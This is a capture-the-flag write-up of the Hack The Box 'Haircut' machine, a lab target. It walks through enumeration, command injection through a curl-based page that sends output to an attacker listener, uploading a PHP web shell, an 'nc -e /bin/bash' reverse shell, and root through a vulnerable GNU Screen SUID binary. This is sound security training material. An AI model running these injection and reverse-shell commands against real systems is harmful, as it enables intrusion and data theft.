# htb-haircut
This is my [Hack the box](https://www.hackthebox.eu/)'s Haircut machine write-up.

## Machine
OS: GNU/Linux

IP: 10.10.10.24

Difficulty: Medium

## Initial enumeration
[Nmap](https://github.com/nmap/nmap) scan on the target:

`nmap -sV -sC -oN shocker.nmap 10.10.10.24`

Flags:
 - `-sV`: Version detection
 - `-sC`: Script scan using the default set of scripts
 - `-oN`: Output in normal nmap format

```
root@kali:~/htb/haircut# nmap -sC -sV -oN haircut.nmap 10.10.10.24
Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-24 13:39 EDT
Nmap scan report for 10.10.10.24
Host is up (0.094s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds
```

The web app running on port 80 just displays an image that does not say much.

Initial directories enumeration with the list `common.txt`:

```
root@kali:~/htb/haircut# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u ${HAIRCUT}
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.24
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 13:55:47 Starting gobuster
===============================================================
/index.html (Status: 200)
/uploads (Status: 301)
===============================================================
2020/05/24 13:56:26 Finished
===============================================================
```

Interesting, there's an `/uploads` directory. Despite it does not seem very useful now, it may come handy in the future.

After trying with several other lists, which was a quite frustrating process to be honest, finally this one got a more intereseting result:

```
root@kali:~/htb/haircut# gobuster dir --url 10.10.10.24 --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.24
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/05/24 15:23:49 Starting gobuster
===============================================================
/uploads (Status: 301)
/exposed.php (Status: 200)
```

The page `/exposed.php` has a text input, and when passing a URL it apparently curls it in the back-end and displays on screen the result. I tried to inject some commands but some symbols/keywords were blocked by the back-end e.g. &, ;, |, python and nc. Curl flags were not blocked, though.

## Exploitation
Checking the man page of `curl`, I thought that by using curl's request body (-d) it could be possible to transmit arbitrary info to a listener. By leveraging backticks, it could be possible to pass the result of a command execution to the listener. Neat!

Set up listener on the attacker machine: 
```
nc -lvp 4444
```

Commands now can be executed from the input of the `/exposed.php` page as follows, and the result of the executed command will be passed as data to the listener:
```
$IP_ATTACKER:4444 -d "`command goes here`"
```
With this we can get the following:
- `whoami` returns `www-data`.
- It is possible to even get the user flag already!: ```cat /home/maria/Desktop/user``` (always check `/home` for getting users)
- ```ls -alh``` returns
```
drwxr-xr-x 3 root     root     4.0K May 19  2017 .
drwxr-xr-x 3 root     root     4.0K May 16  2017 ..
-rwxr-xr-x 1 root     root     114K May 15  2017 bounce.jpg
-rwxr-xr-x 1 root     root     164K May 15  2017 carrie.jpg
-rwxr-xr-x 1 root     root      921 May 15  2017 exposed.php
-rwxr-xr-x 1 root     root      141 May 15  2017 hair.html
-rwxr-xr-x 1 root     root      144 May 15  2017 index.html
-rwxr-xr-x 1 root     root     133K May 15  2017 sea.jpg
-rwxr-xr-x 1 root     root      223 May 15  2017 test.html
drwxr-xr-x 2 www-data www-data 4.0K May 22  2017 uploads
```

It seems `uploads` may be a good place to locate a web shell as `www-data` can write to it. I'm going to use a PHP web shell called `Predator.php` available [here](https://github.com/JohnTroony/php-webshells.git). Note that other much simpler web shells should be enough, I just wanted to check that one out :)

The first step to copy the shell into the target server, is to make the shell "curleable" by exposing it through an HTTP server on the attacker:
```
$ cd php-webshells
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

And now from `/exposed.php` we curl it sending the file to `/uploads` leveraging the `-o` (output file) flag:
```
10.10.14.23:8000/Predator.php -o uploads/Predator.php
```

The shell is accessible from `uploads/Predator.php`, so let's set up a reverse shell using it.

Set `nc` listener in the attacker to handle the reverse shell:
```
nc -lvp 4444
```

The web shell allows the user to execute in the target system. Connect to the attacker as follows:
```
nc $IP_ATTACKER 4444 -e /bin/bash
```

Upgrade shell to more interactive one:
```
python3 -c "import pty; pty.spawn('/bin/bash');"
```

By running `LinEnum.sh` (copied to the target machine by setting up a Python http server as before), it can be noticed that there's a suspicious SUID executable in /usr/bin/screen-4.5.0, that turns out to be a vulnerable version that allows to escalate privileges:
```
$ searchsploit screen 4.5.0
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation              | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)        | linux/local/41152.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I'd encourage you to first check the PoC to see what's going on, basically it is possible to create a file owned by root that can be edited by us (www-data in this case) which can be used to do privilege escalation.

When trying to execute the script (first exploit listed) it's noticeable that it needs some manual action to be functional:
- Change the way in which the script creates the .c files. It does is using `cat` and it does not work properly.
- ```gcc``` fails to compile as it does not find `cc1`. By doing `locate cc1` we see this is its location: `/usr/lib/gcc/x86_64-linux-gnu/5`. Adding that path to the PATH env var retrying did the trick.

After completing these manual actions, a root shell is popped when executing the script:
```
# whoami
whoami
root
```
